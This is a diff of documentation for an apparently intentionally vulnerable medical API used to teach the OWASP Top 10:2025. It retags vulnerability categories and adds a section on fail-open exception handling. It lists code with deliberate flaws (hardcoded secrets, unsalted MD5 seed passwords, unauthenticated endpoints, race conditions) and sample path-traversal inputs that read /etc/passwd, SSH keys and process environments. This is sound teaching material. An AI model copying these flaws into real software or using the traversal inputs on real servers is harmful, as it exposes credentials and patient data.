@@ -1,6 +1,9 @@
 # Vulnerable Configuration — MediConnect API
 
-Branch: `vulnerable` | Purpose: OWASP Top 10 education / attack demonstration
+Branch: `vulnerable` | Purpose: OWASP Top 10:2025 education / attack demonstration
+
+> Vulnerability category tags throughout this document and all source-code comments map to the **OWASP Top 10:2025** list:
+> `[A01]` Broken Access Control · `[A02]` Security Misconfiguration · `[A03]` Software Supply Chain Failures · `[A04]` Cryptographic Failures · `[A05]` Injection · `[A06]` Insecure Design · `[A07]` Authentication Failures · `[A08]` Software or Data Integrity Failures · `[A09]` Security Logging and Alerting Failures · `[A10]` Mishandling of Exceptional Conditions
 
 ---
 
@@ -23,11 +26,11 @@ docker-compose up -d
 
 ### `src/main/resources/application.yaml`
 
-Full application configuration with intentional vulnerabilities marked `[A02]`.
+Full application configuration with intentional vulnerabilities marked `[A04]`.
 
 #### Vulnerabilities
 
-**1. Hardcoded database credentials [A02]**
+**1. Hardcoded database credentials [A04]**
 ```yaml
 datasource:
   username: root
@@ -37,7 +40,7 @@ Password visible in a plain-text configuration file committed to the repository.
 
 ---
 
-**2. SQL schema leakage via logs [A02]**
+**2. SQL schema leakage via logs [A04]**
 ```yaml
 jpa:
   show-sql: true
@@ -53,7 +56,7 @@ Complete SQL queries with bound parameters are printed to logs — reveals datab
 
 ---
 
-**3. Destructive schema changes [A02]**
+**3. Destructive schema changes [A04]**
 ```yaml
 jpa:
   hibernate:
@@ -63,7 +66,7 @@ Hibernate automatically alters the database schema on startup — risk of data l
 
 ---
 
-**4. Actuator endpoints publicly exposed [A02]**
+**4. Actuator endpoints publicly exposed [A04]**
 ```yaml
 management:
   endpoints:
@@ -84,7 +87,7 @@ All Actuator endpoints accessible without authentication:
 
 ---
 
-**5. Stack trace exposed to client [A02]**
+**5. Stack trace exposed to client [A04]**
 ```yaml
 server:
   error:
@@ -96,7 +99,7 @@ Internal Java stack trace returned in HTTP error responses — reveals file path
 
 ---
 
-**6. Thymeleaf cache disabled [A02]**
+**6. Thymeleaf cache disabled [A04]**
 ```yaml
 thymeleaf:
   cache: false
@@ -124,7 +127,7 @@ Supports exploration of Server-Side Template Injection (SSTI) vulnerabilities.
 
 ### Vulnerabilities in Migrations
 
-**7. PII stored as plaintext without encryption [A04] — V2**
+**7. PII stored as plaintext without encryption [A06] — V2**
 ```sql
 insurance_number  VARCHAR(50),
 date_of_birth     DATE,
@@ -153,7 +156,7 @@ Stored content is displayed without processing — an attacker can inject a `<sc
 
 ---
 
-**10. MD5 seed passwords without salt [A02] — V10**
+**10. MD5 seed passwords without salt [A04] — V10**
 ```sql
 -- admin123  → MD5 → 0192023a7bbd73250516f069df18b500
 -- 12345     → MD5 → 827ccb0eea8a706c4c34a16891f84e7b
@@ -178,7 +181,7 @@ All three values exist in public rainbow tables — passwords are trivially reco
 
 ### Vulnerabilities
 
-**11. passwordHash exposed in API response [A04] — `User.java`, `UserDto.java`**
+**11. passwordHash exposed in API response [A06] — `User.java`, `UserDto.java`**
 ```java
 // No @JsonIgnore — password hash returned in every GET /users/{id} response
 private String passwordHash;
@@ -186,7 +189,7 @@ private String passwordHash;
 
 ---
 
-**12. PII fields exposed in API response without masking [A04] — `Patient.java`, `PatientDto.java`**
+**12. PII fields exposed in API response without masking [A06] — `Patient.java`, `PatientDto.java`**
 ```java
 // All fields returned as plain text — insurance, DOB, blood type, allergies
 private String insuranceNumber;
@@ -243,7 +246,7 @@ private String attachmentPath;
 
 ### Vulnerabilities
 
-**16. Hardcoded JWT secret in source code [A02][A04] — `JwtUtil.java`**
+**16. Hardcoded JWT secret in source code [A04][A06] — `JwtUtil.java`**
 ```java
 private static final String SECRET = "mediconnect-super-secret-2024";
 ```
@@ -251,7 +254,7 @@ Visible in the repository — anyone can sign arbitrary tokens (e.g. `"role": "A
 
 ---
 
-**17. JWT key below 256 bits — WeakKeyException bypassed [A02] — `JwtUtil.java`**
+**17. JWT key below 256 bits — WeakKeyException bypassed [A04] — `JwtUtil.java`**
 ```java
 byte[] keyBytes = Arrays.copyOf(SECRET.getBytes(StandardCharsets.UTF_8), 32);
 return new SecretKeySpec(keyBytes, "HmacSHA256"); // zero-padding instead of a strong key
@@ -277,7 +280,7 @@ An attacker can attempt to replace the `alg` header (`"none"`, `"RS256"`) to byp
 
 ---
 
-**20. MD5 without salt — rainbow table attack [A04] — `PasswordUtils.java`**
+**20. MD5 without salt — rainbow table attack [A06] — `PasswordUtils.java`**
 ```java
 MessageDigest.getInstance("MD5")  // no salt, no iterations
 ```
@@ -285,7 +288,7 @@ Identical passwords → identical hashes. Billions of MD5 hashes available in pu
 
 ---
 
-**21. Timing attack on password comparison [A04] — `PasswordUtils.java`**
+**21. Timing attack on password comparison [A06] — `PasswordUtils.java`**
 ```java
 return hashPassword(rawPassword).equals(hashedPassword); // not timing-safe
 ```
@@ -293,7 +296,7 @@ return hashPassword(rawPassword).equals(hashedPassword); // not timing-safe
 
 ---
 
-**22. All endpoints unauthenticated [A01] + CSRF disabled [A04] — `SecurityConfig.java`**
+**22. All endpoints unauthenticated [A01] + CSRF disabled [A06] — `SecurityConfig.java`**
 ```java
 .csrf(AbstractHttpConfigurer::disable)
 .authorizeHttpRequests(auth -> auth.anyRequest().permitAll())
@@ -356,7 +359,7 @@ An attacker can enumerate all registered usernames by attempting registrations i
 
 ---
 
-**26. JWT in response body — not in HttpOnly cookie [A04]**
+**26. JWT in response body — not in HttpOnly cookie [A06]**
 ```java
 // AuthController.java — token accessible to JavaScript
 return ResponseEntity.ok(Map.of("token", token));
@@ -409,7 +412,7 @@ Any attacker-controlled domain can make authenticated cross-origin requests to t
 
 ---
 
-**31. All security response headers disabled [A02] — `SecurityConfig.java`**
+**31. All security response headers disabled [A04] — `SecurityConfig.java`**
 ```java
 .headers(AbstractHttpConfigurer::disable)
 ```
@@ -417,7 +420,7 @@ Removes: `Strict-Transport-Security`, `X-Frame-Options` (clickjacking), `X-Conte
 
 ---
 
-**32. `NoOpPasswordEncoder` registered — plain-text comparison path [A02] — `SecurityConfig.java`**
+**32. `NoOpPasswordEncoder` registered — plain-text comparison path [A04] — `SecurityConfig.java`**
 ```java
 return NoOpPasswordEncoder.getInstance();
 ```
@@ -479,10 +482,10 @@ Patient A can retrieve the full profile of Patient B (including `passwordHash`, 
 
 ---
 
-**37. passwordHash exposed in API response [A04] — `UserService.java`, `UserDto.java`**
+**37. passwordHash exposed in API response [A06] — `UserService.java`, `UserDto.java`**
 ```java
 // UserService.toDto() — explicitly maps hash into the response
-.passwordHash(user.getPasswordHash())   // [A04] exposed
+.passwordHash(user.getPasswordHash())   // [A06] exposed
 
 // UserDto.java — no @JsonIgnore
 private String passwordHash;
@@ -576,9 +579,9 @@ Patient A can retrieve Patient B's appointment by iterating ID values. There is 
 
 ---
 
-**43. Missing state machine — PUT /api/appointments/{id}/status [A06] — `AppointmentService.java`**
+**43. Missing state machine — PUT /api/appointments/{id}/status [A02] — `AppointmentService.java`**
 ```java
-// [A06] No check of the previous state, no role enforcement
+// [A02] No check of the previous state, no role enforcement
 // Allowed business transitions: REQUESTED → APPROVED → COMPLETED
 //                               REQUESTED → CANCELLED
 // What this enables:
@@ -631,9 +634,9 @@ Doctor D can create a medical record for Patient P with whom they have never had
 
 ---
 
-**46. Unrestricted File Upload — POST /api/medical-records/{id}/attachment [A03] — `MedicalRecordService.java`**
+**46. Unrestricted File Upload — POST /api/medical-records/{id}/attachment [A05] — `MedicalRecordService.java`**
 ```java
-// [A03] No extension, MIME type, magic-byte, or file-size validation
+// [A05] No extension, MIME type, magic-byte, or file-size validation
 String filename = file.getOriginalFilename();   // fully controlled by the attacker
 String storagePath = uploadDir + filename;       // direct concatenation
 Path destination = Paths.get(storagePath);
@@ -643,32 +646,32 @@ Accepted uploads: `.php`, `.jsp`, `.sh`, `.exe`, `application/octet-stream`, `te
 
 ---
 
-**47. Path Traversal (write) — getOriginalFilename() without sanitization [A03] — `MedicalRecordService.java`**
+**47. Path Traversal (write) — getOriginalFilename() without sanitization [A05] — `MedicalRecordService.java`**
 ```java
 // Attacker sends: filename = "../../etc/cron.d/backdoor"
 // storagePath   = "/tmp/mediconnect/uploads/../../etc/cron.d/backdoor"
 // After resolution → writes to /etc/cron.d/backdoor
-String storagePath = uploadDir + filename;   // [A03] no normalize(), no startsWith() check
+String storagePath = uploadDir + filename;   // [A05] no normalize(), no startsWith() check
 ```
 Combined with `REPLACE_EXISTING`, an attacker can overwrite system files (cron jobs, SSH authorized_keys, /etc/passwd) if the JVM process has sufficient permissions.
 
 ---
 
-**48. Path Traversal (read) — filePath query parameter without canonical validation [A03] — `MedicalRecordController.java`, `MedicalRecordService.java`**
+**48. Path Traversal (read) — filePath query parameter without canonical validation [A05] — `MedicalRecordController.java`, `MedicalRecordService.java`**
 ```java
 // GET /api/medical-records/1/attachment?filePath=/etc/passwd
 // GET /api/medical-records/1/attachment?filePath=../../../root/.ssh/id_rsa
 // GET /api/medical-records/1/attachment?filePath=/proc/self/environ
 
 // MedicalRecordService.downloadAttachment():
-Path path = Paths.get(filePath);      // [A03] verbatim — no boundary check
+Path path = Paths.get(filePath);      // [A05] verbatim — no boundary check
 return Files.readAllBytes(path);      // reads any file accessible to the JVM process
 ```
 No comparison against `uploadDir`, no `toAbsolutePath().normalize().startsWith(base)` check. An attacker can read arbitrary files from the server, including configuration files, private keys, and user data.
 
 ---
 
-**49. Filesystem path returned in response [A02] — `MedicalRecordController.java`**
+**49. Filesystem path returned in response [A04] — `MedicalRecordController.java`**
 ```java
 return ResponseEntity.ok(Map.of("path", storedPath));
 // Response: {"path": "/tmp/mediconnect/uploads/report.pdf"}
@@ -737,9 +740,9 @@ By iterating IDs (`/api/lab-results/1`, `/2`, `/3`...) an attacker can retrieve 
 
 ---
 
-**53. Unrestricted File Upload + predictable filename [A03] — `LabResultService.java`**
+**53. Unrestricted File Upload + predictable filename [A05] — `LabResultService.java`**
 ```java
-// [A03] getOriginalFilename() — fully controlled by the attacker
+// [A05] getOriginalFilename() — fully controlled by the attacker
 String filename    = file.getOriginalFilename();   // e.g. "bloodwork.pdf" — always the same
 String storagePath = uploadDir + filename;          // no UUID prefix, no randomization
 Files.copy(file.getInputStream(), destination, StandardCopyOption.REPLACE_EXISTING);
@@ -751,9 +754,9 @@ Issues:
 
 ---
 
-**54. Path Traversal (read) — GET /api/lab-results/{id}/file?filePath= [A03] — `LabResultService.java`**
+**54. Path Traversal (read) — GET /api/lab-results/{id}/file?filePath= [A05] — `LabResultService.java`**
 ```java
-// [A03] filePath — taken verbatim from the query parameter, no boundary check
+// [A05] filePath — taken verbatim from the query parameter, no boundary check
 Path path = Paths.get(filePath);
 return Files.readAllBytes(path);   // reads any file accessible to the JVM process
 ```
@@ -850,9 +853,9 @@ Any caller can delete any message in the system. Combined with `SecurityConfig.p
 
 ### Vulnerabilities
 
-**59. Missing state machine — PUT /api/prescriptions/{id}/dispense allows double dispensing [A06] — `PrescriptionService.java`**
+**59. Missing state machine — PUT /api/prescriptions/{id}/dispense allows double dispensing [A02] — `PrescriptionService.java`**
 ```java
-// [A06] No status guard before dispensing
+// [A02] No status guard before dispensing
 // Allowed business transition: CREATED → DISPENSED (once)
 // What this allows:
 //   DISPENSED → DISPENSED  (double dispensing — duplicate drug supply / billing fraud)
@@ -865,9 +868,9 @@ A prescription that has already been dispensed can be dispensed again without an
 
 ---
 
-**60. Missing state machine — PUT /api/prescriptions/{id}/status allows any transition [A06] — `PrescriptionService.java`**
+**60. Missing state machine — PUT /api/prescriptions/{id}/status allows any transition [A02] — `PrescriptionService.java`**
 ```java
-// [A06] PrescriptionStatus.valueOf() accepts any valid enum string
+// [A02] PrescriptionStatus.valueOf() accepts any valid enum string
 //        without checking the current state or the allowed transition graph
 prescription.setStatus(PrescriptionStatus.valueOf(status));
 ```
@@ -939,9 +942,9 @@ Since `/api/admin/**` is `permitAll()`, the attacker does not need an existing A
 
 ---
 
-**64. Sensitive Data Exposure — GET /api/admin/config returns raw Environment [A02] — `AdminService.java`**
+**64. Sensitive Data Exposure — GET /api/admin/config returns raw Environment [A04] — `AdminService.java`**
 ```java
-// [A02] Iterates all EnumerablePropertySource instances — includes application.yaml,
+// [A04] Iterates all EnumerablePropertySource instances — includes application.yaml,
 //        OS environment variables, and JVM system properties
 environment.getPropertySources().stream()
         .filter(ps -> ps instanceof EnumerablePropertySource)
@@ -1015,7 +1018,7 @@ The full stack trace is stored in `audit_logs.details` and readable by any calle
 
 **67. Sensitive parameters logged without masking [A04 / A09] — `LoggingInterceptor.java`**
 ```java
-// [A04][A09] No redaction of password, token, secret, or key fields
+// [A06][A09] No redaction of password, token, secret, or key fields
 Map<String, String[]> paramMap = request.getParameterMap();
 String params = paramMap.entrySet().stream()
         .map(e -> e.getKey() + "=" + String.join(",", e.getValue()))
@@ -1044,9 +1047,9 @@ When the `audit_logs` table is exported to a SIEM, flat-file log, or CSV report,
 
 ---
 
-**69. Spoofable IP address via X-Forwarded-For [A04] — `LoggingInterceptor.java`**
+**69. Spoofable IP address via X-Forwarded-For [A06] — `LoggingInterceptor.java`**
 ```java
-// [A04] X-Forwarded-For header trusted without validation
+// [A06] X-Forwarded-For header trusted without validation
 String ip = request.getHeader("X-Forwarded-For");
 if (ip == null || ip.isBlank()) ip = request.getRemoteAddr();
 // Stored verbatim in audit_logs.ip_address
@@ -1055,9 +1058,9 @@ An attacker sends `X-Forwarded-For: 127.0.0.1` and their real IP is never record
 
 ---
 
-**70. Response body logged verbatim — JWT and passwordHash duplicated in audit table [A04] — `LoggingInterceptor.java`**
+**70. Response body logged verbatim — JWT and passwordHash duplicated in audit table [A06] — `LoggingInterceptor.java`**
 ```java
-// [A04] Response body stored in audit_logs — may contain JWT tokens or password hashes
+// [A06] Response body stored in audit_logs — may contain JWT tokens or password hashes
 responseBody = new String(ccr.getContentAsByteArray(), StandardCharsets.UTF_8);
 // GET /api/users/1 response: {"id":1,"passwordHash":"5f4dcc3b...","role":"ADMIN"}
 // POST /api/auth/login response: {"token":"eyJhbGciOiJ..."}
@@ -1080,9 +1083,9 @@ The audit table becomes a secondary credential store. Any SQL injection or datab
 
 ### Vulnerabilities
 
-**71. Internal error messages forwarded to client [A02] — `GlobalExceptionHandler.java`**
+**71. Internal error messages forwarded to client [A04] — `GlobalExceptionHandler.java`**
 ```java
-// [A02] Raw exception message forwarded verbatim — no sanitization, no generic fallback
+// [A04] Raw exception message forwarded verbatim — no sanitization, no generic fallback
 @ExceptionHandler(RuntimeException.class)
 public ResponseEntity<Map<String, Object>> handleRuntime(RuntimeException ex) {
     body.put("error", ex.getMessage());        // internal service message
@@ -1105,7 +1108,7 @@ The `type` field additionally reveals the fully-qualified class name (e.g. `com.
 
 ---
 
-**72. DB table name and PK exposed on 404 [A02] — `GlobalExceptionHandler.java`, `EntityNotFoundException.java`**
+**72. DB table name and PK exposed on 404 [A04] — `GlobalExceptionHandler.java`, `EntityNotFoundException.java`**
 ```java
 // EntityNotFoundException — carries raw persistence details
 super("Entity with ID " + id + " not found in table " + tableName);
@@ -1129,7 +1132,7 @@ An attacker learns the exact table name, enabling targeted SQL injection payload
 
 ---
 
-**73. JVM-level error forwarded to client [A02] — `GlobalExceptionHandler.java`**
+**73. JVM-level error forwarded to client [A04] — `GlobalExceptionHandler.java`**
 ```java
 @ExceptionHandler(Throwable.class)
 public ResponseEntity<Map<String, Object>> handleThrowable(Throwable ex) {
@@ -1207,7 +1210,7 @@ A large `GET /api/users` response returning 50 000 records is held in heap twice
 
 **76. JWT stored in localStorage [A04 / CWE-922] — `AuthContext.tsx`**
 ```typescript
-// [A04] VULNERABLE: storing JWT in localStorage — accessible to any JS on this origin
+// [A06] VULNERABLE: storing JWT in localStorage — accessible to any JS on this origin
 localStorage.setItem('token', data.token)
 localStorage.setItem('user', JSON.stringify(data.user))  // includes passwordHash
 ```
@@ -1231,7 +1234,7 @@ An attacker who intercepts or crafts a token can change `role` to `ADMIN` in the
 
 **78. Client-side role-based access control [A01 / CWE-602] — `ProtectedRoute.tsx`**
 ```typescript
-// [A04] Role read from locally-decoded JWT payload stored in state —
+// [A06] Role read from locally-decoded JWT payload stored in state —
 // signature was never verified (see AuthContext.tsx decodeJwtPayload)
 const userRole = user?.role ?? ''
 if (userRole !== requiredRole) {
@@ -1244,16 +1247,16 @@ Setting `localStorage.setItem('user', JSON.stringify({...JSON.parse(localStorage
 
 **79. Full user object (including passwordHash) persisted in localStorage [A02 / CWE-312] — `AuthContext.tsx`**
 ```typescript
-// [A04] Full user object (including passwordHash from server) stored in localStorage
+// [A06] Full user object (including passwordHash from server) stored in localStorage
 localStorage.setItem('user', JSON.stringify(data.user))
 ```
 The backend `UserService.toDto()` intentionally includes `passwordHash` in the response DTO (vulnerability #4). This hash is now stored in plaintext browser storage, readable via `JSON.parse(localStorage.getItem('user')).passwordHash`.
 
 ---
 
-**80. Raw server error message rendered directly in UI [A02] — `LoginPage.tsx`**
+**80. Raw server error message rendered directly in UI [A04] — `LoginPage.tsx`**
 ```typescript
-// [A02] Raw server error message rendered directly into the DOM
+// [A04] Raw server error message rendered directly into the DOM
 const message =
   (err as { response?: { data?: { error?: string } } })?.response?.data?.error ?? 'Login failed'
 setError(message)
@@ -1264,7 +1267,7 @@ setError(message)
 
 **81. Token read from localStorage injected into every HTTP request [A04 / A07] — `axiosInstance.ts`**
 ```typescript
-// [A04] Insecure Design — token pulled directly from localStorage
+// [A06] Insecure Design — token pulled directly from localStorage
 const token = localStorage.getItem('token')
 if (token) {
   config.headers.Authorization = `Bearer ${token}`
@@ -1274,16 +1277,16 @@ Axios interceptor reads localStorage synchronously on every request, meaning a t
 
 ---
 
-**82. passwordHash column displayed in admin table [A02] — `DashboardPage.tsx`**
+**82. passwordHash column displayed in admin table [A04] — `DashboardPage.tsx`**
 ```typescript
-{/* [A02] passwordHash rendered in plaintext */}
+{/* [A04] passwordHash rendered in plaintext */}
 <td className="py-2 font-mono text-xs break-all">{u.passwordHash ?? '—'}</td>
 ```
 The admin dashboard renders every user's MD5 password hash (already crackable offline) directly in the browser DOM. Combined with the `GET /api/admin/users` endpoint having no ADMIN role check (vulnerability #62), any authenticated user can access this view.
 
 ---
 
-**83. localStorage JWT visible in Token Inspector widget [A04] — `DashboardPage.tsx`**
+**83. localStorage JWT visible in Token Inspector widget [A06] — `DashboardPage.tsx`**
 ```typescript
 {localStorage.getItem('token') ?? 'No token found'}
 ```
@@ -1303,7 +1306,7 @@ The message thread renders `content` from the database as raw HTML without sanit
 
 **85. JWT token embedded as URL query parameter [A04 / CWE-598] — `ProfilePage.tsx`**
 ```typescript
-// [A04] VULNERABLE: JWT in URL — visible in browser history, server access logs,
+// [A06] VULNERABLE: JWT in URL — visible in browser history, server access logs,
 // CDN logs, and Referer headers when the user navigates away
 const exportPdfUrl = `/api/users/${user?.id}/export?format=pdf&token=${token}`
 window.open(exportPdfUrl, '_blank')
@@ -1490,7 +1493,7 @@ Patient A can update Patient B's email address by calling `PUT /api/users/2` wit
 
 ### V11 + V12 Flyway Migrations — extended seed data
 
-**96. MD5 seed passwords without salt — V11 and V12 [A02]**
+**96. MD5 seed passwords without salt — V11 and V12 [A04]**
 
 V11 (`V11__extended_seed_data.sql`) and V12 (`V12__rich_seed_data.sql`) insert 8 additional user accounts (patient2, patient3, doctor2, doctor3, labtech1, pharmacist1 and their associated role records). All passwords are hashed with unsalted MD5:
 
@@ -1503,7 +1506,7 @@ V11 (`V11__extended_seed_data.sql`) and V12 (`V12__rich_seed_data.sql`) insert 8
 | `labtech1` | `labtech123` | `b4a01e79eee4e7a2a4ae1e2a0e0c2e57` |
 | `pharmacist1` | `pharma123` | `35e1e28f6289c6e07c68cb4c15a57e84` |
 
-All values are recoverable via public rainbow tables. The seed also inserts 35+ additional records across appointments, lab results, prescriptions, and messages — all with PII stored as plaintext per V2 schema ([A04]).
+All values are recoverable via public rainbow tables. The seed also inserts 35+ additional records across appointments, lab results, prescriptions, and messages — all with PII stored as plaintext per V2 schema ([A06]).
 
 ---
 
@@ -1543,10 +1546,10 @@ summary.put("unreadMessages", unreadMessages);
 
 ### Frontend — `DashboardPage.tsx`, `Sidebar.tsx`
 
-**99. [A04] Role-aware greeting banner exposes user ID in plaintext — `DashboardPage.tsx`**
+**99. [A06] Role-aware greeting banner exposes user ID in plaintext — `DashboardPage.tsx`**
 ```typescript
-// [A04] User ID exposed in UI — IDOR enumeration aid
-<span className="text-[#F85149]">[A04]</span>{' '}
+// [A06] User ID exposed in UI — IDOR enumeration aid
+<span className="text-[#F85149]">[A06]</span>{' '}
 Logged in as user #{user?.id ?? '—'}
 ```
 The greeting banner renders the authenticated user's database primary key (e.g. `Logged in as user #2`) in the UI. An attacker can cross-reference this ID with IDOR endpoints such as `GET /api/users/{id}`, `GET /api/patients/by-user/{id}`, and `PUT /api/users/{id}` to construct targeted attacks without enumeration.
@@ -1671,9 +1674,9 @@ The pharmacist identity recorded in the audit trail is taken from the request bo
 
 ---
 
-**110. [A06] No state machine on dispense — double dispensing and void prescription dispensing — `PrescriptionService.java`**
+**110. [A02] No state machine on dispense — double dispensing and void prescription dispensing — `PrescriptionService.java`**
 ```java
-// [A06] No guard: DISPENSED → DISPENSED and CANCELLED → DISPENSED both allowed
+// [A02] No guard: DISPENSED → DISPENSED and CANCELLED → DISPENSED both allowed
 prescription.setStatus(PrescriptionStatus.DISPENSED);
 prescription.setPharmacistId(pharmacistId);
 prescription.setDispensedAt(LocalDateTime.now());
@@ -1722,13 +1725,13 @@ The original `defaultValue = "0"` caused the service to append `AND lr.patient_i
 
 ---
 
-**114. [A04] Export to clipboard in Lab Results — patient data without access check — `LabResultsPage.tsx`**
+**114. [A06] Export to clipboard in Lab Results — patient data without access check — `LabResultsPage.tsx`**
 ```tsx
-// [A04] Copies patient ID, test name, result value, notes to clipboard — no server access check
+// [A06] Copies patient ID, test name, result value, notes to clipboard — no server access check
 async function handleExport(r: LabResult) {
   const lines = [`Patient: ${r.patientName} (ID: ${r.patientId})`, ...]
   await navigator.clipboard.writeText(lines.join('\n'))
-  toast('[A04] Exported — patient ID included without access check', 'warning')
+  toast('[A06] Exported — patient ID included without access check', 'warning')
 }
 ```
 The Export button in the detail modal copies full lab result data (including patient ID and notes) to the clipboard. No server request is made — the data was already loaded client-side without row-level access control. Demonstrates insecure design: sensitive clinical data is available to any authenticated user who can reach the page.
@@ -1818,7 +1821,7 @@ The toggle endpoint sits under `/api/admin/**` which is `permitAll()` in `Securi
 
 **119. [A07] Create User modal — role freely settable in request body — `AdminPage.tsx`**
 ```tsx
-// [A07] role freely settable — [A02] backend stores MD5(password) with no salt
+// [A07] role freely settable — [A04] backend stores MD5(password) with no salt
 const createUserMutation = useMutation({
   mutationFn: (body: typeof createForm) => api.post('/admin/users', body),
   ...
@@ -1832,9 +1835,9 @@ The "+ New User" modal allows any authenticated user to create an account with a
 
 ---
 
-**120. [A02] Password field in Create User modal rendered as plain text — `AdminPage.tsx`**
+**120. [A04] Password field in Create User modal rendered as plain text — `AdminPage.tsx`**
 ```tsx
-{/* [A02] plaintext password visible in form field, stored as MD5 with no salt */}
+{/* [A04] plaintext password visible in form field, stored as MD5 with no salt */}
 <Input type="text" placeholder="Stored as MD5(password) with no salt" ... />
 ```
 The password input uses `type="text"` (intentionally), so the value is visible in the browser. The backend hashes it with MD5 and no salt. Demonstrates A02: password handling failures at both ends — plaintext in transit and weak hash at rest.
@@ -1855,15 +1858,15 @@ Every user row shows a toggle button that calls `PATCH /admin/users/{id}/toggle`
 
 ---
 
-**122. [A02] Password hash column — copyable MD5 — `AdminPage.tsx`**
+**122. [A04] Password hash column — copyable MD5 — `AdminPage.tsx`**
 ```tsx
-// [A02] MD5 hash — click to copy — searchable in rainbow tables
-<button onClick={() => copyHash(u)} title="[A02] Click to copy — MD5, no salt, rainbow-table searchable">
+// [A04] MD5 hash — click to copy — searchable in rainbow tables
+<button onClick={() => copyHash(u)} title="[A04] Click to copy — MD5, no salt, rainbow-table searchable">
   <span>{u.passwordHash}</span>
   <Copy size={10} />
 </button>
 ```
-Clicking the password hash cell copies the MD5 value to clipboard. A toast annotates the action with `[A02] MD5 hash copied — searchable in rainbow tables`. The hash is already exposed in the GET /admin/users response; copyability reinforces that it can be directly submitted to crackstation.net or hashcat to recover the plaintext.
+Clicking the password hash cell copies the MD5 value to clipboard. A toast annotates the action with `[A04] MD5 hash copied — searchable in rainbow tables`. The hash is already exposed in the GET /admin/users response; copyability reinforces that it can be directly submitted to crackstation.net or hashcat to recover the plaintext.
 
 ---
 
@@ -1942,16 +1945,213 @@ The dispense mutation sends `{ pharmacistId: user?.id }` in the request body. Th
 
 ---
 
-## OWASP Category Summary
+## Async Refill Queue — A10:2025 Mishandling of Exceptional Conditions
+
+> New module under `/api/refills` + `/refills` UI. The feature is built end-to-end to host
+> A10:2025 vulnerabilities: fail-open authorisation on exceptions (CWE-636), race conditions
+> on retry (CWE-362), unbounded retries (CWE-400), silent exception swallowing (CWE-755),
+> generic `Throwable` catches (CWE-396), missing null checks (CWE-754), schema-permitted
+> null inputs that feed validator NPEs (CWE-665), resource leaks on error paths (CWE-460),
+> and raw exception text returned to callers (CWE-209). See `A10_FEATURE_PLAN.md` for the
+> full design rationale and the demo attack scenarios.
+
+---
+
+**128. [A10] Fail-open promote to READY on any validator exception — `RefillQueueService.java`**
+```java
+try {
+    eligibility.check(r);
+    r.setStatus(RefillStatus.READY);
+} catch (Exception e) {
+    // [A10] FAIL-OPEN: any exception is treated as success.
+    r.setFailureReason(e.toString());
+    r.setStatus(RefillStatus.READY);   // [A10] fail open
+}
+```
+The generic `catch (Exception e)` block — CWE-636 / CWE-755 — promotes the refill row to `READY` whenever the eligibility validator throws (null `quantity` NPE, timeout, constraint violation, anything). The pharmacist UI then shows a green check and the prescription can be dispensed without ever being validated. The raw `e.toString()` (CWE-209) is persisted in `failure_reason` and returned verbatim by `GET /api/refills`.
+
+---
+
+**129. [A10] `catch (Throwable t)` around slip printing hides every error — `RefillQueueService.java`**
+```java
+try {
+    Path slip = slipPrinter.createSlip(r);
+    r.setTempSlipPath(slip.toAbsolutePath().toString());
+    refills.save(r);
+} catch (Throwable t) {
+    // [A10] catching Throwable — masks OOM, StackOverflow, ThreadDeath.
+}
+```
+The `catch (Throwable t) { }` block — CWE-396 — masks every kind of failure including `OutOfMemoryError`, `StackOverflowError`, and `ThreadDeath`. The empty body is the only "log" of the failure; no metric, no audit row, no alert.
+
+---
+
+**130. [A10] `@Scheduled` worker swallows every exception in a single catch — `RefillQueueService.runWorker`**
+```java
+@Scheduled(fixedRate = 30_000)
+public void runWorker() {
+    try {
+        for (RefillRequest r : refills.findTop50ByStatusOrderByCreatedAtAsc(...)) {
+            processOne(r);
+        }
+    } catch (Exception e) {
+        e.printStackTrace();   // [A10] CWE-755 — stderr-only, no rethrow
+    }
+}
+```
+The background worker wraps the whole tick in a single `catch (Exception)`. If any iteration throws, the catch prints to `System.err` and the tick exits silently. No metric, no audit log, no alert. The next tick starts cleanly, masking the previous failure entirely. The queue can silently stop progressing for individual rows that throw without anyone noticing.
+
+---
+
+**131. [A10] TOCTOU race on `dispense` — `RefillQueueService.dispense`**
+```java
+RefillRequest r = refills.findById(id).orElseThrow();
+if (r.getStatus() != RefillStatus.READY) throw new IllegalStateException("not ready");
+try { Thread.sleep(50); } catch (InterruptedException ignored) {}
+r.setStatus(RefillStatus.DISPENSED);
+r.setPharmacistId(pharmacistId);
+return refills.save(r);
+```
+Status is read, compared, and written without any locking — CWE-362 / TOCTOU. Two concurrent `dispense()` calls for the same id both observe `status=READY`, both proceed, both write `DISPENSED`. Inventory decrements twice but only the second audit row is written. No `@Lock(PESSIMISTIC_WRITE)`, no `@Version` column on `RefillRequest`, no `@Transactional(isolation = SERIALIZABLE)`. The frontend "Force Concurrent Dispense" button fires 10 of these in parallel for a one-click reproduction.
+
+---
+
+**132. [A10] Swallowed `InterruptedException` — `RefillQueueService.dispense`**
+```java
+try { Thread.sleep(50); } catch (InterruptedException ignored) {}
+```
+CWE-705 — the swallow loses the thread's interrupt status. During graceful shutdown the JVM interrupts worker threads; this swallow lets the dispense complete anyway, producing transactions that begin after the shutdown signal.
+
+---
+
+**133. [A10] Validator dereferences `quantity` without a null check — `EligibilityValidator.java`**
+```java
+public void check(RefillRequest r) {
+    if (r.getQuantity() > 0 && r.getQuantity() <= 90) return;   // [A10] CWE-754
+    throw new IllegalArgumentException("quantity out of range — ...");
+}
+```
+`r.getQuantity()` is a boxed `Integer` that may be null (schema permits null). The unboxing comparison throws `NullPointerException` on every null. Combined with vulnerability #128 (fail-open catch), null `quantity` bypasses the entire eligibility check.
+
+---
+
+**134. [A10] Schema permits the null that triggers the NPE — `V16__create_refill_requests.sql`**
+```sql
+quantity INT NULL,
+```
+CWE-665 — the column is nullable on purpose. The frontend "Request Refill" button submits `quantity: null` so that the validator NPE is reproducible on the first worker tick. There is also no `UNIQUE (prescription_id, status='READY')` constraint, leaving the CWE-362 double-dispense race fully open.
+
+---
+
+**135. [A10] Slip write happens outside try/finally — `SlipPrinter.createSlip`**
+```java
+Path tmp = Files.createTempFile("refill-", ".slip");
+Files.writeString(tmp, render(r));   // [A10] CWE-460 — if this throws, the temp file lingers
+return tmp;
+```
+CWE-460 — improper cleanup on thrown exception. If `render` or `writeString` throws after the file is created, the partially-written temp file is never deleted. Repeated retries (vulnerability #138) fill the server's temp directory until the filesystem is exhausted.
+
+---
+
+**136. [A10] Raw exception text leaked in `failureReason` — `RefillRequestDto.java` + `GET /api/refills`**
+```java
+@Data @Builder
+public class RefillRequestDto {
+    ...
+    private String failureReason;   // [A10][A09] raw java exception .toString()
+}
+```
